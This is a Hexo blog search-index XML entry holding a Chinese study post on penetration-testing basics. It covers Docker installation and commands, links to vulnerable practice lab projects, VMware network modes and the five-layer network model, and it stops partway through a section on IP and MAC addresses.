<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>渗透基础</title>
    <link href="/2024/11/14/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/11/14/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="Docker操作"><a href="#Docker操作" class="headerlink" title="Docker操作"></a>Docker操作</h2><p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一 个可移植的容器中,然后发布到任何流行的Linux机器或Windows 机器上,也可以实现 虚拟化,容器是完全使用沙箱机制,相互之间不会有任何接口</p><h3 id="Docker-环境安装与基本操作整理"><a href="#Docker-环境安装与基本操作整理" class="headerlink" title="Docker 环境安装与基本操作整理"></a>Docker 环境安装与基本操作整理</h3><h4 id="1-安装-Docker"><a href="#1-安装-Docker" class="headerlink" title="1. 安装 Docker"></a>1. <strong>安装 Docker</strong></h4><ul><li><p><strong>添加 Docker PGP key</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -fsSL https:<span class="hljs-regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="hljs-regexp">/docker-ce/</span>linux<span class="hljs-regexp">/debian/g</span>pg | sudo apt-key add -<br></code></pre></td></tr></table></figure></li><li><p><strong>配置 Docker APT repository</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27;</span> | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/docker.list<br></code></pre></td></tr></table></figure></li><li><p><strong>更新 APT 包列表</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br></code></pre></td></tr></table></figure></li><li><p><strong>卸载旧版本 Docker</strong></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">sudo apt <span class="hljs-built_in">remove</span> docker docker-engine docker.<span class="hljs-built_in">io</span><br></code></pre></td></tr></table></figure></li><li><p><strong>安装 Docker</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install docker-ce<br></code></pre></td></tr></table></figure></li><li><p><strong>查看 Docker 状态</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl status docker</span><br></code></pre></td></tr></table></figure></li><li><p><strong>启动 Docker</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> docker<br></code></pre></td></tr></table></figure></li><li><p><strong>设置 Docker 开机自动启动</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">systemctl <span class="hljs-built_in">enable</span> docker<br></code></pre></td></tr></table></figure></li></ul><h4 id="2-安装-Docker-Compose"><a href="#2-安装-Docker-Compose" class="headerlink" title="2. 安装 Docker Compose"></a>2. <strong>安装 Docker Compose</strong></h4><ul><li><p>下载并安装 Docker Compose</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -L https:<span class="hljs-regexp">//g</span>et.daocloud.io<span class="hljs-regexp">/docker/</span>compose<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/v2.1.0/</span>docker-compose-$(uname -s)-$(uname -m) &gt; <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>docker-compose<br>chmod +x <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>docker-compose<br></code></pre></td></tr></table></figure></li></ul><h4 id="3-Docker-镜像操作"><a href="#3-Docker-镜像操作" class="headerlink" title="3. Docker 镜像操作"></a>3. <strong>Docker 镜像操作</strong></h4><ul><li><p><strong>列出镜像</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker <span class="hljs-selector-tag">image</span> ls -<span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure></li><li><p><strong>拉取镜像</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">docker image pull hello-world<br></code></pre></td></tr></table></figure></li><li><p><strong>删除镜像</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker image <span class="hljs-built_in">rm</span> 镜像名或镜像<span class="hljs-built_in">id</span><br>docker rmi 镜像名或镜像<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="4-Docker-容器操作"><a href="#4-Docker-容器操作" class="headerlink" title="4. Docker 容器操作"></a>4. <strong>Docker 容器操作</strong></h4><ul><li><p><strong>创建容器</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker run <span class="hljs-selector-attr">[options]</span> 镜像名 <span class="hljs-selector-attr">[命令]</span><br></code></pre></td></tr></table></figure><p>常用参数：</p><ul><li><code>-i</code>：以交互模式运行容器</li><li><code>-t</code>：分配伪终端</li><li><code>--name</code>：指定容器名称</li><li><code>-v</code>：目录映射</li><li><code>-d</code>：以守护模式运行容器</li><li><code>-p</code>：端口映射</li><li><code>-e</code>：设置环境变量</li><li><code>--network=host</code>：将主机网络环境映射到容器</li></ul></li><li><p><strong>创建交互式容器</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -it <span class="hljs-attribute">--name</span>=mycentos centos /bin/bash<br></code></pre></td></tr></table></figure><p>在容器中可以随意执行linux命令，就是一个ubuntu的环境，当执行exit命令退出时，该容器也随之停止。</p></li><li><p><strong>创建守护式容器</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -dit <span class="hljs-attribute">--name</span>=mycentos2 centos<br></code></pre></td></tr></table></figure><p>如果对于一个需要长期运行的容器来说，我们可以创建一个守护式容器。在容器内部exit退出时，容器也不会停止。</p></li><li><p><strong>进入运行中的容器</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it 容器名或容器<span class="hljs-built_in">id</span> /bin/bash<br></code></pre></td></tr></table></figure></li><li><p><strong>查看容器</strong></p><ul><li><p>查看正在运行的容器：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">docker <span class="hljs-keyword">container</span> <span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure></li><li><p>查看所有容器（包括已停止的）：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">docker container <span class="hljs-keyword">ls</span> <span class="hljs-params">--all</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>停止和启动容器</strong></p><ul><li><p>停止容器：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker container stop 容器名或容器<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure></li><li><p>启动容器：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">docker container <span class="hljs-keyword">start</span> 容器名或容<span class="hljs-built_in">器id</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>强制停止容器（kill）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker container <span class="hljs-built_in">kill</span> 容器名或容器<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure></li><li><p><strong>删除容器</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker container <span class="hljs-built_in">rm</span> 容器名或容器<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="5-容器保存为镜像"><a href="#5-容器保存为镜像" class="headerlink" title="5. 容器保存为镜像"></a>5. <strong>容器保存为镜像</strong></h4><ul><li><p>保存容器为镜像</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> commit 容器名 镜像名<br></code></pre></td></tr></table></figure></li></ul><h4 id="6-镜像备份与迁移"><a href="#6-镜像备份与迁移" class="headerlink" title="6. 镜像备份与迁移"></a>6. <strong>镜像备份与迁移</strong></h4><ul><li><p><strong>将镜像保存为文件</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">docker save -o <span class="hljs-string">./</span>镜像文件<span class="hljs-string">.tar</span> 镜像名<br></code></pre></td></tr></table></figure></li><li><p><strong>加载镜像文件</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">docker load -i <span class="hljs-string">./</span>镜像文件<span class="hljs-string">.tar</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="Docker-搭建漏洞靶场"><a href="#Docker-搭建漏洞靶场" class="headerlink" title="Docker 搭建漏洞靶场"></a>Docker 搭建漏洞靶场</h3><h4 id="1-VulHub"><a href="#1-VulHub" class="headerlink" title="1. VulHub"></a>1. <strong>VulHub</strong></h4><p>VulHub 提供了多个漏洞靶场的 Docker 镜像，涵盖了 Web 应用、网络服务等各种类型的漏洞。</p><ul><li><strong>GitHub 仓库</strong>:<br><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></li><li><strong>Docker Hub 镜像</strong>:<br><a href="https://hub.docker.com/u/vulhub">https://hub.docker.com/u/vulhub</a></li></ul><p>使用方法：</p><ol><li>拉取并启动所需漏洞靶场镜像</li><li>根据仓库中的文档配置并运行漏洞靶场。</li></ol><h4 id="2-VulApps"><a href="#2-VulApps" class="headerlink" title="2. VulApps"></a>2. <strong>VulApps</strong></h4><p>VulApps 是一个轻量级的漏洞靶场项目，包含一些经典的漏洞场景，适合初学者进行漏洞研究。</p><ul><li><strong>GitHub 仓库</strong>:<br><a href="https://github.com/Medicean/VulApps">https://github.com/Medicean/VulApps</a></li><li><strong>Docker Hub 镜像</strong>:<br><a href="https://hub.docker.com/r/medicean/vulapps">https://hub.docker.com/r/medicean/vulapps</a></li></ul><p>使用方法：</p><ol><li>在 Docker 上启动 <code>vulapps</code> 镜像。</li><li>根据需求选择相应的漏洞场景。</li></ol><h4 id="3-VulFocus"><a href="#3-VulFocus" class="headerlink" title="3. VulFocus"></a>3. <strong>VulFocus</strong></h4><p>VulFocus 是一个漏洞靶场平台，提供了一系列 Web 漏洞模拟环境。用户可以通过平台选择不同的漏洞类型和版本进行测试。</p><ul><li><strong>GitHub 仓库</strong>:<br><a href="https://github.com/fofapro/vulfocus">https://github.com/fofapro/vulfocus</a></li><li><strong>平台网址</strong>:<br><a href="http://vulfocus.fofa.so/#/">http://vulfocus.fofa.so/#/</a></li><li><strong>Docker Hub 镜像</strong>:<br><a href="https://hub.docker.com/u/vulfocu">https://hub.docker.com/u/vulfocu</a></li></ul><p>使用方法：</p><ol><li>使用 Docker 启动不同的漏洞环境。</li><li>根据目标漏洞进行渗透测试。</li></ol><hr><p>如何使用这些漏洞靶场：</p><ol><li><p><strong>拉取镜像</strong>：根据 GitHub 或 Docker Hub 上的镜像名称使用 <code>docker pull</code> 命令来拉取漏洞靶场镜像。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">docker pull vulhub/<span class="hljs-keyword">some</span>-vulnerable-app<br></code></pre></td></tr></table></figure></li><li><p><strong>启动容器</strong>：使用 <code>docker run</code> 启动所需的漏洞容器，通常会有映射端口、环境变量等配置。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">8080</span>:<span class="hljs-number">80</span> vulhub/some-vulnerable-app<br></code></pre></td></tr></table></figure></li><li><p><strong>配置漏洞环境</strong>：根据具体的漏洞靶场需求，进行配置调整。大多数漏洞靶场会提供文档，指导如何操作。</p></li></ol><h2 id="内网靶场虚拟环境搭建"><a href="#内网靶场虚拟环境搭建" class="headerlink" title="内网靶场虚拟环境搭建"></a>内网靶场虚拟环境搭建</h2><h3 id="NAT-模式概述"><a href="#NAT-模式概述" class="headerlink" title="NAT 模式概述"></a>NAT 模式概述</h3><ul><li><strong>NAT（Network Address Translation）模式</strong>允许虚拟机通过主机的网络连接上互联网。</li><li><strong>适合场景</strong>：当网络 IP 资源紧缺，但虚拟机需要访问外部网络时，NAT 模式是理想的选择。虚拟机的 IP 地址由虚拟 DHCP 服务器分配。</li></ul><p>配置说明</p><ul><li>VMware 网络适配器设置<ul><li><strong>vmnet0</strong>：桥接模式（自动连接）</li><li><strong>vmnet1</strong>：仅主机模式（Host-only）</li><li><strong>vmnet8</strong>：NAT 模式</li></ul></li><li>NAT 模式架构<ul><li><strong>虚拟 NAT 设备</strong>：负责将虚拟机的私有 IP 地址转换为主机的 IP 地址，从而通过主机访问外部网络。</li><li><strong>虚拟 DHCP 服务器</strong>：为虚拟机自动分配 IP 地址，通常为 <code>192.168.62.x</code> 的网段。</li></ul></li></ul><p>具体结构说明</p><ul><li><strong>主机</strong>：主机网卡使用 NAT 模式，连接到 VMware Network Adapter VMnet8，IP 地址通常为 <code>192.168.62.1</code>。</li><li><strong>虚拟交换机（Vmnet8）</strong>：连接到主机的 VMware Network Adapter VMnet8，充当虚拟机与主机通信的桥梁。</li><li><strong>虚拟机</strong>：在 NAT 模式下，通过虚拟 NAT 设备和 DHCP 服务器获得 IP 地址（如 <code>192.168.62.158</code>），可以通过主机联网。</li></ul><p>使用 NAT 模式的优点</p><ul><li><strong>简单配置</strong>：无需在虚拟机上手动配置网络地址。</li><li><strong>资源节省</strong>：节省 IP 资源，适用于需要上网的测试环境。</li><li><strong>自动联网</strong>：虚拟机通过主机共享网络，无需额外网络配置</li></ul><p>![已上传的图片](F:\new myblog\STUDY\source\img\file-GkHsOQkysjbvmkUUMkxtj9h2)</p><h3 id="桥接模式概述"><a href="#桥接模式概述" class="headerlink" title="桥接模式概述"></a>桥接模式概述</h3><ul><li><strong>桥接模式</strong>是指将虚拟机的虚拟网卡通过虚拟网桥与主机的物理网卡连接，使虚拟机直接连接到主机所在的物理网络中。</li><li><strong>适合场景</strong>：当虚拟机需要与主机及其他网络设备直接通信时（例如需要独立的 IP 地址，并与主机和局域网其他设备在同一网段中）。</li></ul><p>配置说明</p><ul><li>VMware 网络适配器设置<ul><li><strong>vmnet0</strong>：桥接模式，选择桥接到物理网卡（有线或无线网卡）。</li><li><strong>vmnet1</strong>：NAT 模式。</li><li><strong>vmnet8</strong>：仅主机模式（Host-only）。</li></ul></li><li>桥接模式架构<ul><li><strong>虚拟网桥</strong>：将主机网卡与虚拟机的网卡相连，模拟一个交换机的功能。</li><li><strong>虚拟机网络配置</strong>：在桥接模式下，虚拟机需要与主机在同一网段，并且共享相同的网关和 DNS 配置。</li></ul></li></ul><p>具体结构说明</p><ul><li><strong>主机</strong>：主机网卡通过桥接模式连接到虚拟网桥，获得与物理网络相同的 IP 地址。</li><li><strong>虚拟交换机（Vmnet0）</strong>：充当虚拟机和主机之间的桥梁，允许所有桥接模式的虚拟机在同一个网络内相互通信。</li><li><strong>虚拟机</strong>：桥接模式下的虚拟机需要配置与主机相同的网关和 DNS 服务器，并获得与主机同一网段的 IP 地址（如图中虚拟机 IP 为 <code>192.168.1.x</code> 网段）。</li></ul><p>使用桥接模式的优点</p><ul><li><strong>直接访问局域网</strong>：虚拟机与主机在同一个局域网中，可以直接访问网络中的其他设备。</li><li><strong>独立 IP 地址</strong>：虚拟机可以使用独立的 IP 地址，与局域网设备直接通信。</li><li><strong>高效通信</strong>：适用于需要大量数据交互和相互访问的场景。</li></ul><p>![已上传的图片](F:\new myblog\STUDY\source\img\file-iZ2TYgcVmqBMFnZPGRMx0RcS)</p><h3 id="Host-Only-模式概述"><a href="#Host-Only-模式概述" class="headerlink" title="Host-Only 模式概述"></a>Host-Only 模式概述</h3><ul><li><strong>Host-Only 模式</strong>（仅主机模式）使得虚拟机与主机之间能够互相通信，但虚拟机无法访问外部网络。</li><li><strong>适合场景</strong>：当虚拟机需要与主机直接通信，但不需要连接互联网或局域网时，这种模式非常适用。例如在测试环境中，仅需虚拟机和主机相互交互。</li></ul><p>配置说明</p><ul><li>VMware 网络适配器设置<ul><li><strong>vmnet1</strong>：Host-Only 模式，用于主机和虚拟机之间的通信。</li></ul></li><li>Host-Only 模式架构<ul><li><strong>虚拟交换机（Vmnet1）</strong>：充当主机和虚拟机之间的通信桥梁。</li><li><strong>虚拟 DHCP 服务器</strong>：负责分配 IP 地址，使得主机和虚拟机处于同一网段，通常为 <code>192.168.62.x</code>。</li></ul></li></ul><p>具体结构说明</p><ul><li><strong>主机</strong>：主机的 VMware Network Adapter VMnet1 配置了 Host-Only 网络（IP 地址为 <code>192.168.62.1</code>）。</li><li><strong>虚拟交换机（Vmnet1）</strong>：主机通过 VMnet1 虚拟交换机与虚拟机通信，形成一个封闭的网络。</li><li><strong>虚拟机</strong>：虚拟机获得虚拟 DHCP 服务器分配的 IP 地址（如 <code>192.168.62.158</code>），并与主机相互通信。</li></ul><p>使用 Host-Only 模式的优点</p><ul><li><strong>隔离性</strong>：虚拟机与外部网络完全隔离，形成一个独立的网络环境。</li><li><strong>安全性</strong>：只与主机通信，避免外部网络的安全威胁。</li><li><strong>独立测试环境</strong>：适用于测试需要主机和虚拟机交互的场景，无需联网。</li></ul><p>![已上传的图片](F:\new myblog\STUDY\source\img\TNbA%3D)</p><h2 id="网络协议分层"><a href="#网络协议分层" class="headerlink" title="网络协议分层"></a>网络协议分层</h2><h3 id="网络协议的五层分层结构"><a href="#网络协议的五层分层结构" class="headerlink" title="网络协议的五层分层结构"></a>网络协议的五层分层结构</h3><p>网络协议通常分为五层结构，分别是：<strong>应用层</strong>、<strong>传输层</strong>、<strong>网络层</strong>、<strong>数据链路层</strong>和<strong>物理层</strong>。每一层都有自己独立的功能，各层之间通过接口相互连接，保证了数据从发送方传输到接收方的完整性和正确性。</p><hr><h4 id="1-应用层（Application-Layer）"><a href="#1-应用层（Application-Layer）" class="headerlink" title="1. 应用层（Application Layer）"></a>1. 应用层（Application Layer）</h4><ul><li><strong>作用</strong>：为用户提供网络应用服务，是直接与用户交互的层。</li><li>最上层的，也是我们能直接接触到的就是应用层（ Application Layer），我们电 脑或手机使用的应用软件都是在应用层实现。那么，当两个不同设备的应用需要通信 的时候，应用就把应用数据传给下一层，也就是传输层。 所以，应用层只需要专注于为用户提供应用功能，不用去关心数据是如何传输的，就 类似于，我们寄快递的时候，只需要把包裹交给快递员，由他负责运输快递，我们不 需要关心快速是如何被运输的。 而且应用层是工作在操作系统中的用户态，传输层及以下则工作在内核态。</li><li><strong>特性</strong>：处理特定的应用数据，不需要关心数据如何传输。</li><li><strong>常见协议</strong>：HTTP、FTP、SMTP、DNS等。</li><li><strong>用户态</strong>：应用层运行在操作系统的用户态，提供各种应用程序接口，便于应用开发。</li></ul><hr><h4 id="2-传输层（Transport-Layer）"><a href="#2-传输层（Transport-Layer）" class="headerlink" title="2. 传输层（Transport Layer）"></a>2. 传输层（Transport Layer）</h4><ul><li><strong>作用</strong>：提供端到端的通信服务，负责数据的传输管理。</li><li><strong>特性</strong>：将应用层的数据分割成小的段，提供错误检测、流量控制、重传等功能。</li><li><strong>常见协议</strong>：TCP（传输控制协议）、UDP（用户数据报协议）。</li><li>TCP 的全称叫传输层控制协议（Transmission Control Protocol），大部分应用使用 的正是 TCP 传输层协议，比如 HTTP 应用层协议。TCP 相比 UDP 多了很多特性，比 如流量控制、超时重传、拥塞控制等，这些都是为了保证数据包能可靠地传输给对 方。 UDP 就相对很简单，简单到只负责发送数据包，不保证数据包是否能抵达对方，但 它实时性相对更好，传输效率也高。当然，UDP 也可以实现可靠传输，把 TCP 的特 性在应用层上实现就可以，不过要实现一个商用的可靠 UDP 传输协议，也不是一件 简单的事情。 应用需要传输的数据可能会非常大，如果直接传输就不好控制，因此当传输层的数据 包大小超过 MSS（TCP 最大报文段长度） ，就要将数据包分块，这样即使中途有一 个分块丢失或损坏了，只需要重新这一个分块，而不用重新发送整个数据包。在 TCP  协议中，我们把每个分块称为一个 TCP 段（TCP Segment）。当设备作为接收方时，传输层则要负责把数据包传给应用，但是一台设备上可能会有 很多应用在接收或者传输数据，因此需要用一个编号将应用区分开来，这个编号就是 端口。 比如 80 端口通常是 Web 服务器用的，22 端口通常是远程登录服务器用的。而对于 浏览器（客户端）中的每个标签栏都是一个独立的进程，操作系统会为这些进程分配 临时的端口号。 由于传输层的报文中会携带端口号，因此接收方可以识别出该报文是发送给哪个应用</li><li><strong>内核态</strong>：传输层运行在操作系统的内核态，直接与网络层交互，为数据提供可靠性。</li></ul><hr><h4 id="3-网络层（Network-Layer）"><a href="#3-网络层（Network-Layer）" class="headerlink" title="3. 网络层（Network Layer）"></a>3. 网络层（Network Layer）</h4><ul><li><strong>作用</strong>：负责路径选择和数据转发，实现跨网络的数据传输。</li><li><strong>特性</strong>：网络层使用逻辑地址（如IP地址）进行寻址，将数据发送到目标网络。</li><li><strong>常见协议</strong>：IP（互联网协议）、ICMP（互联网控制消息协议）、ARP（地址解析协议）。</li><li>传输层可能大家刚接触的时候，会认为它负责将数据从一个设备传输到另一个设备， 事实上它并不负责。 实际场景中的网络环节是错综复杂的，中间有各种各样的线路和分叉路口，如果一个 设备的数据要传输给另一个设备，就需要在各种各样的路径和节点进行选择，而传输 层的设计理念是简单、高效、专注，如果传输层还负责这一块功能就有点违背设计原 则了。 也就是说，我们不希望传输层协议处理太多的事情，只需要服务好应用即可，让其作 为应用间数据传输的媒介，帮助实现应用到应用的通信，而实际的传输功能就交给下 一层，也就是网络层（Internet Layer）。网络层最常使用的是 IP 协议（Internet Protocol），IP 协议会将传输层的报文作为数 据部分，再加上 IP 包头组装成 IP 报文，如果 IP 报文大小超过 MTU（以太网中一般 为 1500 字节）就会再次进行分片，得到一个即将发送到网络的 IP 报文</li><li>网络层负责将数据从一个设备传输到另一个设备，实现主机与主机之间的通信，也叫点对点（end to end）通 信，世界上那么多设备，又该如何找到 对方呢？因此，网络层需要有区分设备的编号。 我们一般用 IP 地址给设备进行编号，对于 IPv4 协议， IP 地址共 32 位，分成了四 段，每段是 8 位。只有一个单纯的 IP 地址虽然做到了区分设备，但是寻址起来就特 别麻烦，全世界那么多台设备，难道一个一个去匹配？这显然不科学。 因此，需要将 IP 地址分成两种意义： 一个是网络号，负责标识该 IP 地址是属于哪个子网的； 一个是主机号，负责标识同一子网下的不同主机； 怎么分的呢？这需要配合子网掩码才能算出 IP 地址 的网络号和主机号。那么在寻址 的过程中，先匹配到相同的网络号，才会去找对应的主机。 除了寻址能力， IP 协议还有另一个重要的能力就是路由。实际场景中，两台设备并 不是用一条网线连接起来的，而是通过很多网关、路由器、交换机等众多网络设备连 接起来的，那么就会形成很多条网络的路径，因此当数据包到达一个网络节点，就需 要通过算法决定下一步走哪条路径。 所以，IP 协议的寻址作用是告诉我们去往下一个目的地该朝哪个方向走，路由则是 根据「下一个目的地」选择路径。寻址更像在导航，路由更像在操作方向盘</li></ul><p>![image-20241114203316631](F:\new myblog\STUDY\source\img\image-20241114203316631.png)</p><ul><li><strong>功能</strong>：进行路由选择，决定数据通过哪条路径到达目的地。</li></ul><p>![image-20241114203117316](F:\new myblog\STUDY\source\img\image-20241114203117316.png)</p><hr><h4 id="4-数据链路层（Data-Link-Layer）"><a href="#4-数据链路层（Data-Link-Layer）" class="headerlink" title="4. 数据链路层（Data Link Layer）"></a>4. 数据链路层（Data Link Layer）</h4><ul><li><strong>作用</strong>：负责在同一网络内的节点之间传输数据，保证数据的可靠传输。</li><li><strong>特性</strong>：数据链路层使用物理地址（如MAC地址）来进行节点的寻址。</li><li>实际场景中，网络并不是一个整体，比如你家和我家就不属于一个网络，所以数据不 仅可以在同一个网络中设备间进行传输，也可以跨网络进行传输。 一旦数据需要跨网络传输，就需要有一个设备同时在两个网络当中，这个设备一般是 路由器，路由器可以通过路由表计算出下一个要去的 IP 地址。 那问题来了，路由器怎么知道这个 IP 地址是哪个设备的呢？ 于是，就需要有一个专门的层来标识网络中的设备，让数据在一个链路中传输，这就 是数据链路层（Data Link Layer），它主要为网络层提供链路级别传输的服务</li><li><strong>常见协议</strong>：以太网协议、PPP（点对点协议）、帧中继等。</li><li><strong>功能</strong>：提供错误检测、帧同步等功能。</li></ul><hr><h4 id="5-物理层（Physical-Layer）"><a href="#5-物理层（Physical-Layer）" class="headerlink" title="5. 物理层（Physical Layer）"></a>5. 物理层（Physical Layer）</h4><ul><li><strong>作用</strong>：负责比特流的传输，即物理上将数据从一个节点传送到另一个节点。</li><li><strong>特性</strong>：直接与物理介质（如网线、光纤）相连，处理电信号或光信号的传输。</li><li>当数据准备要从设备发送到网络时，需要把数据包转换成电信号，让其可以在物理介 质中传输，这一层就是物理层（Physical Layer），它主要是为数据链路层提供二进 制传输的服务</li><li><strong>功能</strong>：定义了物理介质的接口标准，如电压、频率、信道等。</li></ul><p>![image-20241114203211430](F:\new myblog\STUDY\source\img\image-20241114203211430.png)</p><ol><li><strong>应用层：发送包裹</strong></li></ol><ul><li>应用层就像寄件人，我们想把包裹寄给远方的朋友。在这个阶段，我们关注的是<strong>寄什么</strong>（比如信件、包裹）和<strong>寄给谁</strong>。</li><li>应用层提供了各种“寄包裹”的方式，比如浏览网页、发送邮件、下载文件等。</li><li>就像寄包裹时不关心快递公司怎么运送一样，应用层也不关心数据是如何传输的。</li></ul><ol start="2"><li><strong>传输层：分包和贴上标签</strong></li></ol><ul><li>传输层负责把“大包裹”分成“多个小包裹”，并在每个包裹上贴上发件人和收件人的标签，以便快递公司能按顺序送达每个小包裹。</li><li>有些包裹可能会丢失，传输层负责检查哪些包裹没送到，并让快递公司重新送。</li><li>这就像快递公司贴上的快递单，确保每个包裹能被送到正确的收件人手中。</li></ul><ol start="3"><li><strong>网络层：规划路线</strong></li></ol><ul><li>网络层负责选择“快递路线”，决定包裹从哪个仓库到哪个中转站，再到最终的配送站。</li><li>它相当于一张地图，根据最优路径把包裹送到目标地点附近。</li><li>就像地图指引快递员走哪条路，网络层用IP地址来找到去往收件人所在城市或小区的最佳路径。</li></ul><ol start="4"><li><strong>数据链路层：本地配送</strong></li></ol><ul><li>数据链路层负责在“最后一公里”把包裹送到目的地附近的小区或大楼。</li><li>它就像快递小哥在小区内挨家挨户地分发包裹。</li><li>这层是最接近设备本地的，使用设备的“物理地址”（类似门牌号）来找到收件人。</li></ul><ol start="5"><li><strong>物理层：传输包裹的车辆和道路</strong></li></ol><ul><li>物理层是最底层，负责实际把包裹从一个地方运输到另一个地方。</li><li>它相当于快递公司使用的“快递车、火车或飞机”等工具，把包裹物理地移动。</li><li>就像一辆辆装着包裹的快递车在路上行驶，物理层使用电缆、光纤等媒介传输数据，确保信号传到下一个节点。</li></ul><p>总结一下</p><ul><li><strong>应用层</strong>：决定要发什么东西（数据）和发给谁（目标）。</li><li><strong>传输层</strong>：把大件分成小件，每件都贴好收件人地址。</li><li><strong>网络层</strong>：规划路线，把小包裹送到正确的城市或小区。</li><li><strong>数据链路层</strong>：负责本地的配送，找到具体的楼层或门牌号。</li><li><strong>物理层</strong>：让快递车、火车等工具实际运输包裹。</li></ul><p>通过这种层层协作，数据最终能准确地从一台设备传到另一台设备。</p><h4 id="IP-和-MAC"><a href="#IP-和-MAC" class="headerlink" title="IP 和 MAC"></a>IP 和 MAC</h4><ul><li><strong>IP 地址（网络层）</strong>：IP 负责“跨区”传输数据，它像是我们出行时的<strong>行程表</strong>，定义了数据从源头到目的地的整体路径。IP 地址主要用于在不同网络之间传输数据，是一个全局的地址，标识每个设备在网络中的位置。</li><li><strong>MAC 地址（数据链路层）</strong>：MAC 负责“局部”传输数据，它像是我们乘坐交通工具的<strong>车票</strong>，限定了数据在一个特定网络区间内的传输。MAC 地址是设备的物理地址，标识了同一个网络区间（如局域网）内设备之间的通信。</li></ul><p>关系</p><ul><li>当数据需要传输时，<strong>IP 地址</strong>会指定整个行程的起点和终点（源 IP 和目的 IP），确保数据能传递到目标设备所在的网络。</li><li>在这个传输过程中，数据会经过多个网络区间，每经过一个新的网络区间，<strong>MAC 